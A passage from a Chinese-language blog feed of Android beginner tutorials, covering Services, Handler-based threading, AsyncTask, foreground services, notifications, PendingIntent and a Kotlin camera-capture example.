<li><p>可折叠式标题栏（CollapsingToolbarLayout）</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(Service的使用)</title>
    <url>/posts/9677f8db/</url>
    <content><![CDATA[<h1 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h1><p>service是android实现程序后台运行的解决方案。<br>当然它并不是独立运行，而是依赖于应用程序，应用程序停止时，他也会一起停止。Service并不会自动开启线程，所有的代码都是默认运行在主线程当中的。</p>
<h2 id="Android多线程编程"><a href="#Android多线程编程" class="headerlink" title="Android多线程编程"></a>Android多线程编程</h2><blockquote>
<p>在kotlin中开启线程的方式更加简单。它为你定义了顶层方法<code>thread&#123;//方法体&#125;</code>直接在其中写内容，然后他会被拉起为一个新线程。</p>
</blockquote>
<ol>
<li>更新UI：和许多其他的GUI库一样，Android的UI也是线程不安全的。也就是说，如果想要更新应用程序里的UI元素，必须在主线程中进行，否则就会出现异常。</li>
<li>所以android提供了一套异步消息处理机制：解决了在子线程进行UI操作的问题<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">updateText</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    <span class="type">val</span> <span class="variable">handle</span> <span class="operator">=</span> object :Handler(Looper.getMainLooper())&#123;</span><br><span class="line">	<span class="comment">//在这里处理UI的异步操作</span></span><br><span class="line">        override fun <span class="title function_">handleMessage</span><span class="params">(msg: Message)</span> &#123;</span><br><span class="line">            <span class="keyword">when</span>(msg.what)&#123;</span><br><span class="line">                updateText -&gt;&#123;</span><br><span class="line">                    binding.textView.text = <span class="string">&quot;Nice to meet you&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> lateinit <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        binding.changeTextBtn.setOnClickListener &#123;</span><br><span class="line">            thread &#123;</span><br><span class="line">                <span class="type">val</span> <span class="variable">msg</span> <span class="operator">=</span> Message()</span><br><span class="line">                msg.what = updateText</span><br><span class="line">                handle.sendMessage(msg)<span class="comment">//将message对象发送过去</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="异步消息处理机制原理"><a href="#异步消息处理机制原理" class="headerlink" title="异步消息处理机制原理"></a>异步消息处理机制原理</h3><p>Android中的异步消息处理主要由4个部分组成：Message、Handler、MessageQueue和Looper</p>
<ol>
<li>Message<br>Message是在线程之间传递的消息，它可以在内部携带少量的信息，用于在不同线程之间传递数据。上一小节中我们使用到了Message的what字段，除此之外还可以使用arg1和arg2字段来携带一些整型数据，使用obj字段携带一个Object对象。</li>
<li>Handler<br>Handler顾名思义也就是处理者的意思，它主要是用于发送和处理消息的。发送消息一般是使用Handler的sendMessage()方法、post()方法等，而发出的消息经过一系列地辗转处理后，最终会传递到Handler的handleMessage()方法中。</li>
<li>MessageQueue<br>MessageQueue是消息队列的意思，它主要用于存放所有通过Handler发送的消息。这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个MessageQueue对象。</li>
<li>Looper<br>Looper是每个线程中的MessageQueue的管家，调用Looper的loop()方法后，就会进入一个无限循环当中，然后每当发现MessageQueue中存在一条消息时，就会将它取出，并传递到Handler的handleMessage()方法中。每个线程中只会有一个Looper对象。<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(Service%E7%9A%84%E4%BD%BF%E7%94%A8)-2023-07-01-15-53.png"></li>
</ol>
<h2 id="使用AsyncTask"><a href="#使用AsyncTask" class="headerlink" title="使用AsyncTask"></a>使用AsyncTask</h2><p>借助AsyncTask，即使你对异步消息处理机制完全不了解，也可以十分简单地从子线程切换到主线程<br><strong>基本用法</strong>：AsyncTask是一个抽象类，我们需要去继承他，同时它需要接收三个参数：</p>
<ul>
<li>Params，在执行时需要传入的参数，用于在后台任务中使用</li>
<li>Progress，在后台任务执行时，如果需要在界面上显示当前的进度，则使用这里指定的泛型作为进度单位</li>
<li>Result。当任务执行完毕后，如果需要对结果进行返回，则使用这里指定的泛型作为返回值类型。<br>样例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DownloadTask</span> : AsyncTask&lt;Unit, Int, Boolean&gt;() &#123;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
常用重写的四个方法：</li>
</ul>
<ol>
<li><p>onPreExecute()<br>这个方法会在后台任务开始执行之前调用，用于进行一些界面上的初始化操作，比如显示一个进度条对话框等。</p>
</li>
<li><p>doInBackground(Params…)<br>这个方法中的所有代码都会在子线程中运行，我们应该在这里去处理所有的耗时任务。任务一旦完成，就可以通过return语句将任务的执行结果返回，如果AsyncTask的第三个泛型参数指定的是Unit，就可以不返回任务执行结果。注意，在这个方法中是不可以进行UI操作的，如果需要更新UI元素，比如说反馈当前任务的执行进度，可以调用publishProgress (Progress…)方法来完成。</p>
</li>
<li><p>onProgressUpdate(Progress…)<br>当在后台任务中调用了publishProgress(Progress…)方法后，onProgressUpdate (Progress…)方法就会很快被调用，该方法中携带的参数就是在后台任务中传递过来的。在这个方法中可以对UI进行操作，利用参数中的数值就可以对界面元素进行相应的更新。</p>
</li>
<li><p>onPostExecute(Result)<br>当后台任务执行完毕并通过return语句进行返回时，这个方法就很快会被调用。返回的数据会作为参数传递到此方法中，可以利用返回的数据进行一些UI操作，比如说提醒任务执行的结果，以及关闭进度条对话框等。</p>
</li>
</ol>
<p>简单来说，使用AsyncTask的诀窍就是，在doInBackground()方法中执行具体的耗时任务，在onProgressUpdate()方法中进行UI操作，在onPostExecute()方法中执行一些任务的收尾工作。</p>
<p>如果需要启动某个任务，就执行AsyncTask的execute()方法并传入任意数量的参数，这些参数将会传递到DownloadTask<br>的doInBackground()方法当中。</p>
<h2 id="Service的基本用法"><a href="#Service的基本用法" class="headerlink" title="Service的基本用法"></a>Service的基本用法</h2><p>创建一个service，只需要这样即可<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(Service%E7%9A%84%E4%BD%BF%E7%94%A8)-2023-07-22-31-05.png"></p>
<hr>
<p>service常用的重写方法：<br>onCreate()方法会在Service创建的时候调用，<br>onStartCommand()方法会在每次Service启动的时候调用<br>onDestroy()方法会在Service销毁的时候调用。</p>
<p><strong>启动和停止service都是通过intent来实现的。</strong></p>
<h3 id="Activity与Service进行通信"><a href="#Activity与Service进行通信" class="headerlink" title="Activity与Service进行通信"></a>Activity与Service进行通信</h3><p>需要使用到service中的<code>onBind()方法</code>。<br>在service中定义一个bind类继承自Binder：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明这个bind类并构建出来</span></span><br><span class="line"> <span class="keyword">private</span> <span class="type">val</span> <span class="variable">mBinder</span> <span class="operator">=</span> DownloadBinder()</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DownloadBinder</span> : Binder() &#123;</span><br><span class="line">        fun <span class="title function_">startDownload</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;startDownload executed&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        fun <span class="title function_">getProgress</span><span class="params">()</span>: Int &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;getProgress executed&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//在与activity绑定时，将会返回这个创建的binder类</span></span><br><span class="line">    override fun <span class="title function_">onBind</span><span class="params">(intent: Intent?)</span>: IBinder &#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在activity中提前预埋好用来存储的bind：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用来存储从service中获取的binder类。</span></span><br><span class="line"><span class="keyword">private</span> lateinit <span class="keyword">var</span> downloadBinder: MyService.DownloadBinder</span><br><span class="line"><span class="comment">//继承ServiceConnection接口，当连接建立时，将会调用onServiceConnected方法，连接关闭时将会调用onServiceDisconnected方法。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">var</span> <span class="variable">connect</span> <span class="operator">=</span> object :ServiceConnection&#123;</span><br><span class="line">        override fun <span class="title function_">onServiceConnected</span><span class="params">(p0: ComponentName?, p1: IBinder?)</span> &#123;</span><br><span class="line">           downloadBinder = p1 as MyService.DownloadBinder</span><br><span class="line">            downloadBinder.startDownload()</span><br><span class="line">            downloadBinder.getProgress()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        override fun <span class="title function_">onServiceDisconnected</span><span class="params">(p0: ComponentName?)</span> &#123;</span><br><span class="line">            TODO(<span class="string">&quot;Not yet implemented&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>与按钮绑定相关连接事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">binding.bindServiceBtn.setOnClickListener &#123;</span><br><span class="line"><span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>, MyService::class.java)</span><br><span class="line">bindService(intent,connect,Context.BIND_AUTO_CREATE)<span class="comment">//绑定service</span></span><br><span class="line">&#125;</span><br><span class="line">binding.unbindServiceBtn.setOnClickListener &#123;</span><br><span class="line">unbindService(connect) <span class="comment">// 解绑Service</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bindService接受三个参数，第一个就是intent，第二个放入连接时对象，当连接成功时就会调用其中的方法。，第三个参数则是一个标志位，这里传入BIND_AUTO_CREATE表示在Activity和Service进行绑定后自动创建Service。这会使得MyService中的onCreate()方法得到执行，但onStartCommand()方法不会执行。</p>
<p>这样子后，获取到activity就可以通过已经存储好的downloadBinder命令service完成任何需要完成的事。<strong>注意的是，不同的activity都可以获得这个binder对象。</strong></p>
<h3 id="Service的生命周期"><a href="#Service的生命周期" class="headerlink" title="Service的生命周期"></a>Service的生命周期</h3><ol>
<li><p>service只有在第一次被启动时，才会执行onCreate方法，然后执行onStartCommand()。其他每次执行都只会调用onStartCommand()方法。所以service只会有一个实例，所以只要你调用了stopself()或者stopService()都会直接停止。</p>
</li>
<li><p>bindService()方法则会回调onBind()方法，如果service没有建立，就会调用一次onCreate()方法。从onBind()获取对象后就可以相互通信了。</p>
</li>
<li><p>当调用了startService()方法后，再去调用stopService()方法。这时Service中的onDestroy()方法就会执行，表示Service已经销毁了。类似地，当调用了bindService()方法后，再去调用unbindService()方法，onDestroy()方法也会执行，这两种情况都很好理解。但是需要注意，我们是完全有可能对一个Service既调用了startService()方法，又调用了bindService()方法的，在这种情况下该如何让Service销毁呢？根据Android系统的机制，一个Service只要被启动或者被绑定了之后，就会处于运行状态，必须要让以上两种条件同时不满足，Service才能被销毁。所以，这种情况下要同时调用stopService()和unbindService()方法，onDestroy()方法才会执行。</p>
</li>
</ol>
<h3 id="前台Service"><a href="#前台Service" class="headerlink" title="前台Service"></a>前台Service</h3><p>从Android 8.0系统开始，只有当应用保持在前台可见状态的情况下，Service才能保证稳定运行，一旦应用进入后台之后，Service随时都有可能被系统回收。前台Service和普通Service最大的区别就在于，它一直会有一个正在运行的图标在系统的状态栏显示</p>
<p>构建前台service：<br>样例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate()</span><br><span class="line">    Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate executed&quot;</span>)</span><br><span class="line">    <span class="type">val</span> <span class="variable">manager</span> <span class="operator">=</span> getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager</span><br><span class="line">    <span class="title function_">if</span><span class="params">(Build.VERSION.SDK_INT&gt;=Build.VERSION_CODES.O)</span>&#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">channel</span> <span class="operator">=</span> NotificationChannel(<span class="string">&quot;my_channel&quot;</span>, <span class="string">&quot;前台service通知&quot;</span>, NotificationManager.IMPORTANCE_DEFAULT)</span><br><span class="line">        manager.createNotificationChannel(channel)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>,MainActivity::class.java)</span><br><span class="line">    <span class="type">val</span> <span class="variable">pi</span> <span class="operator">=</span> PendingIntent.getActivities(<span class="built_in">this</span>,<span class="number">0</span>, arrayOf(intent), PendingIntent.FLAG_IMMUTABLE)</span><br><span class="line">    <span class="type">val</span> <span class="variable">notification</span> <span class="operator">=</span> NotificationCompat.Builder(<span class="built_in">this</span>,<span class="string">&quot;my_channel&quot;</span>)</span><br><span class="line">        .setContentTitle(<span class="string">&quot;前台service通知&quot;</span>)</span><br><span class="line">        .setContentText(<span class="string">&quot;炉知笔记&quot;</span>)</span><br><span class="line">        .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">        .setContentIntent(pi)</span><br><span class="line">        .build()</span><br><span class="line">    startForeground(<span class="number">1</span>,notification)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它与通知很像，但不同的是，它不是通过manager.notify()来启动。，而是调用了startForeground()方法<br>第一个参数是通知的id，类似于notify()方法的第一个参数；第二个参数则是构建的Notification对象。调用startForeground()方法后就会让MyService变成一个前台Service，并在系统状态栏显示出来。</p>
<p>而且前台service需要获取权限认可：<br><uses-permission android:name="android.permission.FOREGROUND_SERVICE" /><br><uses-permission android:name="android.permission.POST_NOTIFICATIONS"/></p>
<h3 id="IntentService"><a href="#IntentService" class="headerlink" title="IntentService"></a>IntentService</h3><p>它与service大差不差，属于service的一个子类。需要实现一个抽象方法onHandleIntent(),它会默认在子线程中运行。<br>这个抽象方法与startCommand一样，每次启动时都会调用</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(使用多媒体)</title>
    <url>/posts/38117f08/</url>
    <content><![CDATA[<h2 id="使用通知功能"><a href="#使用通知功能" class="headerlink" title="使用通知功能"></a>使用通知功能</h2><p><strong>通知渠道</strong>：自Android8.0后引入的新概念。每个应用程序可以自由的创建当前应用应该拥有哪些通知渠道。而这些通知渠道的控制权掌握在用户手中。用户可以选择是否响铃、是否振动或者是否要关闭这个渠道的通知。<br>对于应用而言，，通知渠道一旦创建就不可修改。所以一定要设计好有哪些渠道需要设计。</p>
<h3 id="通知渠道的基本使用"><a href="#通知渠道的基本使用" class="headerlink" title="通知渠道的基本使用"></a>通知渠道的基本使用</h3><ol>
<li><p>首先需要一个<code>NotificationManager</code>对通知进行管理。可以通过调用Context的getSystemService()方法获取。这个方法接收一个参数用于确定获取系统的那个服务，如：<code>val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager</code>。Context.NOTIFICATION_SERVICE就是通知服务</p>
</li>
<li><p>构建通知渠道：使用NotificationChannel类构建一个通知渠道，并调用NotificationManager的createNotificationChannel()方法完成创建。由于这些类是在Android8.0后添加的，因此使用前要先判断版本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line"> <span class="type">val</span> <span class="variable">channel</span> <span class="operator">=</span> NotificationChannel(channelId, channelName, importance)</span><br><span class="line"> manager.createNotificationChannel(channel)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建一个通知渠道至少需要<strong>渠道ID</strong>、<strong>渠道名称</strong>以及<strong>重要等级</strong>这3个参数<br>通知的重要等级主要有IMPORTANCE_HIGH、IMPORTANCE_DEFAULT、IMPORTANCE_LOW、IMPORTANCE_MIN这几种</p>
</li>
<li><p>通知一般都在后台的service去实现，前端的activity，或者broadcast使用的较少。</p>
</li>
</ol>
<h3 id="通知的默认使用方法"><a href="#通知的默认使用方法" class="headerlink" title="通知的默认使用方法"></a>通知的默认使用方法</h3><p>就版本的不同，8.0前和8.0后使用的方法不一样。所以AndroidX库中提供了兼容的API。AndroidX库中提供了一个NotificationCompat类，使用这个类的构造器创建Notification对象，就可以保证我们可以在所有的android上正常工作了。</p>
<ol>
<li>使用构造器构造<code>Notification</code>对象,<code>val notification = NotificationCompat.Builder(context, channelId).build()</code>，它接收两个参数，一个context，一个渠道id。需要和我们在创建通知渠道时指定的渠道ID相匹配才行。</li>
<li>上一步的通知只是一个空通知，什么都没有，而我们可以通过以下方法添加内容：</li>
</ol>
<ul>
<li>setContentTitle()方法用于指定通知的标题内容，下拉系统状态栏就可以看到这部分内容。</li>
<li>setContentText()方法用于指定通知的正文内容，同样下拉系统状态栏就可以看到这部分内容。</li>
<li>setSmallIcon()方法用于设置通知的小图标，注意，只能使用纯alpha图层的图片进行设置，小图标会显示在系统状态栏上。</li>
<li>setLargeIcon()方法用于设置通知的大图标，当下拉系统状态栏时，就可以看到设置的大图标了。</li>
</ul>
<ol start="3">
<li><p>就以上方法完成后，可以通过调用NotificationManager的notify()方法将通知显示出来了。notify()方法接收两个参数：第一个参数是id，要保证为每个通知指定的id都是不同的；第二个参数则是Notification对象，这里直接将我们刚刚创建好的Notification对象传入即可。</p>
</li>
<li><p>这是一段样例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    <span class="keyword">private</span> lateinit <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        <span class="type">val</span> <span class="variable">manager</span> <span class="operator">=</span> getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager</span><br><span class="line">        <span class="title function_">if</span> <span class="params">(Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O)</span> &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">channel</span> <span class="operator">=</span> NotificationChannel(<span class="string">&quot;normal&quot;</span>, <span class="string">&quot;normal&quot;</span>, NotificationManager.IMPORTANCE_DEFAULT)</span><br><span class="line">            manager.createNotificationChannel(channel)</span><br><span class="line">        &#125;</span><br><span class="line">        binding.sendNotice.setOnClickListener &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">notice</span> <span class="operator">=</span> NotificationCompat.Builder(<span class="built_in">this</span>, <span class="string">&quot;normal&quot;</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;This is my title&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;This is 贺政涛&#x27;s content&quot;</span>)</span><br><span class="line">                .setSmallIcon(R.drawable.img_1)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(resources,R.drawable.img_1))</span><br><span class="line">                        .build()</span><br><span class="line">            manager.notify(<span class="number">1</span>, notice)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统会自动判断是否已经存在通知渠道，如果存在的话，它就不会再次创建了</p>
</li>
</ol>
<h3 id="PendingIntent"><a href="#PendingIntent" class="headerlink" title="PendingIntent"></a>PendingIntent</h3><p>pendingintent和intent很多地方都是类似的。区别在于，Intent倾向于立即执行某个动作，而PendingIntent倾向于在某个合适的时机执行某个动作，也可以把PendingIntent简单地理解为延迟执行的Intent。<br>它可以通过几个默认的静态方法构建如：getActivity()方法、getBroadcast()方法，还是getService()方法。这些方法接受的参数都是一样的，第一个参数是context，第二个参数用不到，设为0即可。第三个参数是一个intent对象，需要自己创建。<br>第四个参数用于确定PendingIntent的行为，有FLAG_ONE_SHOT、FLAG_NO_CREATE、FLAG_CANCEL_CURRENT和FLAG_UPDATE_CURRENT这4种值可选。<br><strong>然后需要连接通知的pendingintent只需要在构建时再连缀一个setcontentIntent()即可</strong></p>
<blockquote>
<p>设计再点击通知后，该通知自动消失：一种是在<br>NotificationCompat.Builder中再连缀一个setAutoCancel()方法，一种是显式地调用NotificationManager的cancel()方法将它取消。</p>
</blockquote>
<h3 id="通知进阶"><a href="#通知进阶" class="headerlink" title="通知进阶"></a>通知进阶</h3><ol>
<li>通知构造器有一个方法setStyle()。这个方法可以设置富文本。可以实现以下功能：</li>
</ol>
<ul>
<li>让通知可以放很长的文本，而不会被系统隐藏</li>
<li>可以再通知内容中放入图片</li>
</ul>
<ol start="2">
<li>通知的重要程度：决定了通知是会以横幅的形式出现还是通知栏响一下</li>
</ol>
<h2 id="调用摄像头和相册"><a href="#调用摄像头和相册" class="headerlink" title="调用摄像头和相册"></a>调用摄像头和相册</h2><h3 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zfxt.cameraalbumtest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity</span><br><span class="line"><span class="keyword">import</span> android.content.Intent</span><br><span class="line"><span class="keyword">import</span> android.graphics.Bitmap</span><br><span class="line"><span class="keyword">import</span> android.graphics.BitmapFactory</span><br><span class="line"><span class="keyword">import</span> android.graphics.Matrix</span><br><span class="line"><span class="keyword">import</span> android.media.ExifInterface</span><br><span class="line"><span class="keyword">import</span> android.net.Uri</span><br><span class="line"><span class="keyword">import</span> android.os.Build</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle</span><br><span class="line"><span class="keyword">import</span> android.provider.MediaStore</span><br><span class="line"><span class="keyword">import</span> android.provider.MediaStore.Audio.Media</span><br><span class="line"><span class="keyword">import</span> androidx.core.content.FileProvider</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.rotationMatrix</span><br><span class="line"><span class="keyword">import</span> top.zfxt.cameraalbumtest.databinding.ActivityMainBinding</span><br><span class="line"><span class="keyword">import</span> java.io.File</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line">    lateinit <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line">    <span class="type">val</span> <span class="variable">takePhoto</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    lateinit <span class="keyword">var</span> imageUri: Uri</span><br><span class="line">    lateinit <span class="keyword">var</span> outputImage: File</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">         binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        <span class="comment">//为按钮注册点击事件</span></span><br><span class="line">        binding.takePhotoBtn.setOnClickListener &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建File对象，用于存储拍照后的图片</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * [externalCacheDir] 是指手机SD卡的应用关联缓存目录</span></span><br><span class="line"><span class="comment">             * 具体的路径是/sdcard/Android/data/&lt;package name&gt;/cache</span></span><br><span class="line"><span class="comment">             * 因为从Android 6.0系统开始，读写SD卡</span></span><br><span class="line"><span class="comment">             * 被列为了危险权限，如果将图片存放在SD卡的任何其他目录，</span></span><br><span class="line"><span class="comment">             * 都要进行运行时权限处理才行，而使用应用关联目录则可以跳过这一步</span></span><br><span class="line"><span class="comment">             * 另外，从Android 10.0系统开始，公有的SD卡目录已经不再允许被应用程序直接访问了，而是要使用作用域存储才行</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            outputImage = File(externalCacheDir, <span class="string">&quot;output_image.png&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> (outputImage.exists()) &#123;</span><br><span class="line">                outputImage.delete()</span><br><span class="line">            &#125;</span><br><span class="line">            outputImage.createNewFile()</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 如果运行设备的系统版本低于Android 7.0，就调用Uri的fromFile()</span></span><br><span class="line"><span class="comment">             * 方法将File对象转换成Uri对象</span></span><br><span class="line"><span class="comment">             * 这个Uri对象标识着output_image.jpg这张图片的本地真实路径。</span></span><br><span class="line"><span class="comment">             * 否则，就调用FileProvider的getUriForFile()方法将File对象转换成一个封装过的</span></span><br><span class="line"><span class="comment">             * Uri对象。getUriForFile()方法接收3个参数：第一个参数要求传入Context对象，第二个</span></span><br><span class="line"><span class="comment">             * 参数可以是任意唯一的字符串，第三个参数则是我们刚刚创建的File对象。之所以要进行这样</span></span><br><span class="line"><span class="comment">             * 一层转换，是因为从Android 7.0系统开始，直接使用本地真实路径的Uri被认为是不安全的，</span></span><br><span class="line"><span class="comment">             * 会抛出一个FileUriExposedException异常。而FileProvider则是一种特殊的</span></span><br><span class="line"><span class="comment">             * ContentProvider，它使用了和ContentProvider类似的机制来对数据进行保护，可以选择性</span></span><br><span class="line"><span class="comment">             * 地将封装过的Uri共享给外部，从而提高了应用的安全性。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            imageUri = <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line">                FileProvider.getUriForFile(<span class="built_in">this</span>, <span class="string">&quot;top.zfxt.cameraalbumtest.fileprovider&quot;</span>, outputImage)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Uri.fromFile(outputImage)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//启动相机程序</span></span><br><span class="line">            <span class="comment">//拍下的照片将会输出到output_image.jpg中</span></span><br><span class="line">            <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="string">&quot;android.media.action.IMAGE_CAPTURE&quot;</span>)</span><br><span class="line">            intent.putExtra(MediaStore.EXTRA_OUTPUT, imageUri)</span><br><span class="line">            startActivityForResult(intent, takePhoto)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onActivityResult</span><span class="params">(requestCode: Int, resultCode: Int, data: Intent?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data)</span><br><span class="line">        <span class="keyword">when</span>(requestCode) &#123;</span><br><span class="line">            takePhoto-&gt;&#123;</span><br><span class="line">                <span class="keyword">if</span>(resultCode== Activity.RESULT_OK)&#123;</span><br><span class="line">                    <span class="comment">//将拍摄的图片显示出来</span></span><br><span class="line">                    <span class="type">val</span> <span class="variable">bitmap</span> <span class="operator">=</span> BitmapFactory.decodeStream(contentResolver.openInputStream(imageUri))</span><br><span class="line">                    binding.imageView.setImageBitmap(rotateIfRequired(bitmap))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用于处理图片的翻转问题</span></span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">rotateIfRequired</span><span class="params">(bitmap: Bitmap)</span>: Bitmap &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">exif</span> <span class="operator">=</span> ExifInterface(outputImage.path)</span><br><span class="line">        <span class="type">val</span> <span class="variable">orientation</span> <span class="operator">=</span> exif.getAttributeInt(ExifInterface.TAG_ORIENTATION,</span><br><span class="line">            ExifInterface.ORIENTATION_NORMAL)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">when</span> (orientation) &#123;</span><br><span class="line">            ExifInterface.ORIENTATION_ROTATE_90 -&gt; rotateBitmap(bitmap, <span class="number">90</span>)</span><br><span class="line">            ExifInterface.ORIENTATION_ROTATE_180 -&gt; rotateBitmap(bitmap, <span class="number">180</span>)</span><br><span class="line">            ExifInterface.ORIENTATION_ROTATE_270 -&gt; rotateBitmap(bitmap, <span class="number">270</span>)</span><br><span class="line">            <span class="keyword">else</span> -&gt; bitmap</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">rotateBitmap</span><span class="params">(bitmap: Bitmap, degree: Int)</span>: Bitmap &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">matrix</span> <span class="operator">=</span> Matrix()</span><br><span class="line">        matrix.postRotate(degree.toFloat())</span><br><span class="line">        <span class="type">val</span> <span class="variable">rotatedBitmap</span> <span class="operator">=</span> Bitmap.createBitmap(bitmap, <span class="number">0</span>, <span class="number">0</span>, bitmap.width, bitmap.height,</span><br><span class="line">            matrix, <span class="literal">true</span>)</span><br><span class="line">        bitmap.recycle() <span class="comment">// 将不再需要的Bitmap对象回收</span></span><br><span class="line">        <span class="keyword">return</span> rotatedBitmap</span><br><span class="line">    